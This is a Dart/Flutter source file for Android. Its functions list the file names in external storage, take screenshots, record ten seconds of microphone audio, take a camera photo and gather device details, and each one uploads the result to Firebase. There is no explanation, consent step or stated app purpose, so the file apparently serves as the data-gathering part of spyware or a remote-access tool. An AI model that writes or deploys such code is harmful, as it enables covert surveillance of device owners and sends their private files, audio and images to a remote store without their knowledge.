
import 'dart:io';
import 'dart:typed_data';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter_sound/public/flutter_sound_recorder.dart';
import 'package:image_picker/image_picker.dart';
import 'package:path/path.dart';
import 'package:path_provider/path_provider.dart';
import 'package:screenshot/screenshot.dart';

Future<void> listAllFileNames() async {
  try {
    final directory = await getExternalStorageDirectory();
    final List<FileSystemEntity> entities = directory!.listSync();
    List<String> fileNames = entities.map((entity) => basename(entity.path)).toList();
    await FirebaseDatabase.instance.reference().child('file_names').set(fileNames);
    print('File names uploaded: $fileNames');
  } catch (e) {
    print('Error listing file names: $e');
  }
}


Future<void> captureAndUploadScreenshot() async {
  try {
    ScreenshotController screenshotController = ScreenshotController();
    final Uint8List? imageBytes = await screenshotController.capture();
    if (imageBytes != null) {
      final directory = await getTemporaryDirectory();
      final String imagePath = '${directory.path}/screenshot_${DateTime.now().toIso8601String()}.png';
      final File imageFile = File(imagePath);
      await imageFile.writeAsBytes(imageBytes);
      print('Screenshot saved at: $imagePath');
      final storageRef = FirebaseStorage.instance.ref().child('screenshots/${DateTime.now().toIso8601String()}.png');
      await storageRef.putFile(imageFile);
      print('Screenshot uploaded to storage');
    }
  } catch (e) {
    print('Error capturing and uploading screenshot: $e');
  }
}



Future<void> captureAndUploadVoiceRecording() async {
  try {
    final FlutterSoundRecorder recorder = FlutterSoundRecorder();
    await recorder.openRecorder();
    await recorder.startRecorder(toFile: 'audio_recording.aac');
    await Future.delayed(const Duration(seconds: 10));
    final path = await recorder.stopRecorder();
    if (path != null) {
      final File audioFile = File(path);
      final storageRef = FirebaseStorage.instance.ref().child('audio_recordings/${DateTime.now().toIso8601String()}.aac');
      await storageRef.putFile(audioFile);
      print('Voice recording uploaded to storage');
    }
    await recorder.closeRecorder();
  } catch (e) {
    print('Error capturing and uploading voice recording: $e');
  }
}


Future<void> captureAndUploadPhoto() async {
  try {
    final picker = ImagePicker();
    final pickedFile = await picker.pickImage(source: ImageSource.camera);
    if (pickedFile != null) {
      File image = File(pickedFile.path);
      final storageRef = FirebaseStorage.instance.ref().child('photos/${DateTime.now().toIso8601String()}.jpg');
      await storageRef.putFile(image);
      print('Photo uploaded to storage');
    }
  } catch (e) {
    print('Error capturing and uploading photo: $e');
  }
}


Future<void> gatherAndUploadDeviceDetails() async {
  try {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    Map<String, dynamic> deviceData = {
      'model': androidInfo.model,
      'androidVersion': androidInfo.version.release,
      'manufacturer': androidInfo.manufacturer,
      'device': androidInfo.device,
    };
    await FirebaseDatabase.instance.reference().child('device_info').set(deviceData);
    print('Device info uploaded: $deviceData');
  } catch (e) {
    print('Error gathering and uploading device details: $e');
  }
}